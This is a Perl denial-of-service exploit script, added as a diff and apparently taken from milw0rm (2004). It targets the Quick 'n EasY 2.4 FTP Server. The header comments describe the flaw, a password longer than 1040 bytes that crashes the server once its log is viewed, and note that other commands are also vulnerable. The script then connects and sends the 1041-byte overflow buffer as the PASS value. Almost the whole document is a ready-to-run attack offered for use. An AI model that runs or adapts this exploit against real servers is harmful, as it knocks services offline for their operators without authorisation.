@@ -1,0 +1,39 @@
+#!/usr/local/bin/perl -w
+
+###########################################################
+###########################################################
+##   Quick 'n EasY VER 2.4 Ftp Server remote D.o.S
+##         Discovered,exploited by KaGra
+##	Tested on WinXP SP1 English version
+## sENDING a big buffer in PASS,at least 1041 bytes	
+## will crash the sever,as long as the logfile on server
+## is viewed or just at the time it will be viewed.This
+## sploit works also for almost ALL commands (like APPE
+## ,CWD etc),but as u understand,for them U should have at
+## least a guest account.For this sploit,no account needed.
+## PS:Many thankz to muts for the shellcode at Ability Server APPE sploit...
+############################################################
+############################################################
+
+
+use Net::FTP;
+
+
+$hostname = 'localhost'; 		#Remote Host to D.o.S!
+$username = 'anonymous'; 		#AnythinG HeRe!
+
+print "\n[*]BuiLDinG BuFfer...\n";
+
+$password = 'A'x1041   ; 		#OverFlow BuffEr!
+print "[*]ConnectinG To TarGet...\n";
+
+$ftp = Net::FTP->new($hostname);        # Connecting...
+print "[*]SenDing DeViL...\n\n";
+
+$ftp->login($username, $password);      # Send EviL BuffeR...
+
+$ftp->quit;
+print "SerVer Has Been Dosed,will be Down if  LogFile is or will be viewed!\n";
+
+
+# milw0rm.com [2004-10-24]
